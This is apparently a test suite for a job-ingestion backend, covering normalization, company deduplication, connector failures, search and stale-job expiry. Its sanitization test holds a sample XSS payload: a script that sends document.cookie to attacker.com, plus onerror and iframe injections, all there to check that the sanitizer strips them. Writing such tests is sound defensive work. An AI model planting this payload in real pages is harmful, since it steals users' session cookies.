import { test, describe, before, after } from 'node:test';
import assert from 'node:assert';
import { prisma } from '../database/prisma.js';
import { JobNormalizationService } from '../services/jobNormalization.service.js';
import { JobIngestionService } from '../services/jobIngestion.service.js';
import { CompanyRepository } from '../repositories/company.repository.js';
import { JobRepositoryV1 } from '../repositories/job.repository.js';
import { ConnectorRegistry } from '../jobSources/v1/connectorRegistry.js';
import { IJobSourceConnector, IConnectorJobRaw } from '../jobSources/v1/jobSourceConnector.interface.js';
import { RemoteType, EmploymentType, JobStatus, SourceHealth } from '@prisma/client';

describe('Sprint 3: Production Job Discovery + Company/Job Engine Suite', () => {
  const TEST_COMPANY_NAME = 'Acme Corp Sprint3 Test';
  const TEST_DOMAIN = 'acme-sprint3-test.io';

  before(async () => {
    // Cleanup any prior test artifacts
    await prisma.job.deleteMany({
      where: { company: { name: TEST_COMPANY_NAME } }
    });
    await prisma.company.deleteMany({
      where: { name: TEST_COMPANY_NAME }
    });
  });

  after(async () => {
    // Clean up created test jobs & company
    await prisma.job.deleteMany({
      where: { company: { name: TEST_COMPANY_NAME } }
    });
    await prisma.company.deleteMany({
      where: { name: TEST_COMPANY_NAME }
    });
  });

  describe('1. Normalization & Security (HTML Sanitization, Hashing, Remote/Employment Types)', () => {
    test('should sanitize malicious HTML and strip dangerous tags/scripts from job descriptions', () => {
      const maliciousHtml = `
        <div>
          <h2>Senior Systems Engineer</h2>
          <script>window.location='https://attacker.com/steal?cookie=' + document.cookie;</script>
          <p>We are seeking an experienced engineer.</p>
          <img src="x" onerror="alert('XSS!')" />
          <iframe src="https://evil.com"></iframe>
        </div>
      `;

      const sanitized = JobNormalizationService.sanitizeHtml(maliciousHtml);
      assert.ok(!sanitized.includes('<script>'), 'Script tag must be stripped');
      assert.ok(!sanitized.includes('onerror'), 'Event handlers must be stripped');
      assert.ok(!sanitized.includes('<iframe>'), 'Iframe must be stripped');
      assert.ok(sanitized.includes('We are seeking an experienced engineer.'), 'Safe text must be retained');
    });

    test('should normalize remote and employment types deterministically', () => {
      assert.strictEqual(
        JobNormalizationService.normalizeRemoteType('Remote', 'San Francisco', 'Backend Engineer'),
        RemoteType.REMOTE
      );
      assert.strictEqual(
        JobNormalizationService.normalizeRemoteType('Hybrid', 'New York', 'Full Stack Developer'),
        RemoteType.HYBRID
      );
      assert.strictEqual(
        JobNormalizationService.normalizeRemoteType(undefined, 'Berlin, Germany', 'Site Reliability Engineer'),
        RemoteType.ON_SITE
      );

      assert.strictEqual(JobNormalizationService.normalizeEmploymentType('Full-time'), EmploymentType.FULL_TIME);
      assert.strictEqual(JobNormalizationService.normalizeEmploymentType('contractor'), EmploymentType.CONTRACT);
      assert.strictEqual(JobNormalizationService.normalizeEmploymentType('intern'), EmploymentType.INTERNSHIP);
    });

    test('should compute deterministic content hash', () => {
      const hash1 = JobNormalizationService.computeContentHash('Stripe', 'Senior SRE', 'Dublin', 'req-123', 'Manage infrastructure');
      const hash2 = JobNormalizationService.computeContentHash('Stripe', 'Senior SRE', 'Dublin', 'req-123', 'Manage infrastructure');
      const hash3 = JobNormalizationService.computeContentHash('Stripe', 'Lead SRE', 'Dublin', 'req-123', 'Manage infrastructure');

      assert.strictEqual(hash1, hash2, 'Identical attributes must yield identical content hash');
      assert.notStrictEqual(hash1, hash3, 'Different title must yield distinct content hash');
    });
  });

  describe('2. Company Registry & Deduplication', () => {
    test('should resolve company by official domain first and avoid duplicate companies', async () => {
      const comp1 = await CompanyRepository.resolveOrCreate({
        name: TEST_COMPANY_NAME,
        officialDomain: TEST_DOMAIN,
        industry: 'Software Infrastructure'
      });

      assert.ok(comp1.id);
      assert.strictEqual(comp1.name, TEST_COMPANY_NAME);

      // Attempt resolve with same domain but different name variation
      const comp2 = await CompanyRepository.resolveOrCreate({
        name: 'Acme Corp Alternate Branch',
        officialDomain: TEST_DOMAIN
      });

      assert.strictEqual(comp1.id, comp2.id, 'Should deduplicate by official domain');
    });

    test('should keep companies with same name but differing official domains separate', async () => {
      const compUK = await CompanyRepository.resolveOrCreate({
        name: 'Nexus Corp Global',
        officialDomain: 'nexuscorp.co.uk'
      });

      const compUS = await CompanyRepository.resolveOrCreate({
        name: 'Nexus Corp Global',
        officialDomain: 'nexuscorp.com'
      });

      assert.notStrictEqual(compUK.id, compUS.id, 'Companies with distinct official domains must never be merged');

      // Cleanup
      await prisma.company.deleteMany({
        where: { id: { in: [compUK.id, compUS.id] } }
      });
    });

    test('should register company source and update health correctly', async () => {
      const company = await CompanyRepository.resolveOrCreate({
        name: TEST_COMPANY_NAME,
        officialDomain: TEST_DOMAIN
      });

      const source = await CompanyRepository.registerSource({
        companyId: company.id,
        sourceType: 'GREENHOUSE',
        sourceName: 'Greenhouse Public Board',
        sourceUrl: 'https://boards.greenhouse.io/acmetest',
        externalIdentifier: 'acmetest'
      });

      assert.ok(source.id);
      assert.strictEqual(source.healthStatus, SourceHealth.HEALTHY);

      // Simulate failure tracking
      const failedOnce = await CompanyRepository.updateSourceHealth(source.id, false, 'Connection timeout');
      assert.strictEqual(failedOnce.failureCount, 1);
      assert.strictEqual(failedOnce.healthStatus, SourceHealth.DEGRADED);

      // Simulate recovery
      const recovered = await CompanyRepository.updateSourceHealth(source.id, true);
      assert.strictEqual(recovered.failureCount, 0);
      assert.strictEqual(recovered.healthStatus, SourceHealth.HEALTHY);
    });
  });

  describe('3. Ingestion Idempotency & Deduplication', () => {
    test('should create job on first ingestion and update freshness on duplicate ingestion without creating new row', async () => {
      const company = await CompanyRepository.resolveOrCreate({
        name: TEST_COMPANY_NAME,
        officialDomain: TEST_DOMAIN
      });

      const rawJob: IConnectorJobRaw = {
        externalJobId: 'ext-acme-001',
        sourceType: 'GREENHOUSE',
        sourceName: 'Greenhouse',
        sourceUrl: 'https://boards.greenhouse.io/acmetest/jobs/101',
        title: 'Staff Software Engineer',
        companyName: TEST_COMPANY_NAME,
        companyDomain: TEST_DOMAIN,
        location: 'Seattle, WA, United States',
        remoteType: 'REMOTE',
        employmentType: 'FULL_TIME',
        salaryMin: 180000,
        salaryMax: 240000,
        salaryCurrency: 'USD',
        experienceMin: 8,
        descriptionText: 'Lead our distributed systems core team.',
        responsibilities: ['Architecture design', 'System reliability'],
        requirements: ['Go', 'Kubernetes', 'Distributed Systems'],
        skills: ['Go', 'Kubernetes', 'PostgreSQL']
      };

      const normalized = JobNormalizationService.normalize(rawJob);

      // First run: insert
      const res1 = await JobRepositoryV1.upsertNormalizedJob(company.id, normalized);
      assert.strictEqual(res1.isNew, true, 'First insertion must be marked as new');
      const firstJobId = res1.job.id;

      // Second run with same job
      const res2 = await JobRepositoryV1.upsertNormalizedJob(company.id, normalized);
      assert.strictEqual(res2.isNew, false, 'Repeated ingestion must not be new');
      assert.strictEqual(res2.job.id, firstJobId, 'Job ID must be preserved across syncs');

      // Verify skills attached
      const retrieved = await JobRepositoryV1.findById(firstJobId);
      assert.ok(retrieved);
      assert.ok(retrieved.skills.length >= 2, 'Skills must be linked to canonical Skill records');
    });
  });

  describe('4. Connector Failure Isolation', () => {
    test('should isolate connector failures without crashing ingestion process', async () => {
      // Create a mock failing connector
      class FailingMockConnector implements IJobSourceConnector {
        public readonly sourceType = 'FAILING_TEST_SOURCE';
        public readonly sourceName = 'Failing Test Source';
        public readonly defaultBaseUrl = 'https://nonexistent.test.example';
        public readonly capabilities = {
          supportsPagination: false,
          supportsRemoteFilter: false,
          requiresBoardIdentifier: false,
          rateLimitPerMinute: 10
        };

        public async discover(): Promise<IConnectorJobRaw[]> {
          throw new Error('503 Service Unavailable');
        }
        public async fetchJobs(): Promise<IConnectorJobRaw[]> {
          throw new Error('503 Service Unavailable');
        }
        public async healthCheck(): Promise<{ healthy: boolean; latencyMs: number; error?: string }> {
          return { healthy: false, latencyMs: 50, error: '503' };
        }
      }

      ConnectorRegistry.register(new FailingMockConnector());

      // Ingest the failing source
      const metrics = await JobIngestionService.ingestSource('FAILING_TEST_SOURCE');
      assert.strictEqual(metrics.success, false);
      assert.strictEqual(metrics.jobsDiscovered, 0);
      assert.ok(metrics.error?.includes('503 Service Unavailable'));

      // Verify that another valid source can still ingest without interruption
      const cwMetrics = await JobIngestionService.ingestSource('CODEWALLA', { limit: 1 });
      assert.ok(cwMetrics.jobsDiscovered > 0 || cwMetrics.success, 'Failing connector must not block other sources');
    });
  });

  describe('5. Search & Multi-param Filtering', () => {
    test('should filter jobs by text, remoteType, and country', async () => {
      const searchRes = await JobRepositoryV1.searchJobs({
        query: 'Staff',
        remoteType: RemoteType.REMOTE,
        pageSize: 10
      });

      assert.ok(searchRes.items.length >= 1);
      const found = searchRes.items.find(j => j.title.includes('Staff'));
      assert.ok(found);
      assert.strictEqual(found.remoteType, RemoteType.REMOTE);
      assert.strictEqual(found.status, JobStatus.ACTIVE);
      assert.ok(found.company);
    });

    test('should paginate search results correctly', async () => {
      const p1 = await JobRepositoryV1.searchJobs({ page: 1, pageSize: 1 });
      assert.strictEqual(p1.pagination.page, 1);
      assert.strictEqual(p1.pagination.pageSize, 1);
      assert.ok(p1.pagination.total >= 1);
    });
  });

  describe('6. Freshness & Stale Job Expiration', () => {
    test('should transition stale jobs past threshold to EXPIRED', async () => {
      // Create a stale job directly with old lastSeenAt (e.g. 20 days ago)
      const company = await CompanyRepository.resolveOrCreate({
        name: TEST_COMPANY_NAME,
        officialDomain: TEST_DOMAIN
      });

      const staleDate = new Date(Date.now() - 20 * 24 * 60 * 60 * 1000);
      const staleJob = await prisma.job.create({
        data: {
          companyId: company.id,
          title: 'Obsolete Test Role',
          description: 'This position was filled weeks ago.',
          sourceType: 'TEST',
          sourceName: 'Test Board',
          sourceUrl: 'https://example.com/stale',
          contentHash: 'stale-test-hash-999',
          remoteType: RemoteType.REMOTE,
          employmentType: EmploymentType.FULL_TIME,
          lastSeenAt: staleDate,
          firstSeenAt: staleDate,
          status: JobStatus.ACTIVE
        }
      });

      const expiredCount = await JobRepositoryV1.expireStaleJobs(14);
      assert.ok(expiredCount >= 1, 'At least 1 stale job must be marked as EXPIRED');

      const rechecked = await prisma.job.findUnique({ where: { id: staleJob.id } });
      assert.strictEqual(rechecked?.status, JobStatus.EXPIRED);

      // Cleanup
      await prisma.job.delete({ where: { id: staleJob.id } });
    });
  });
});
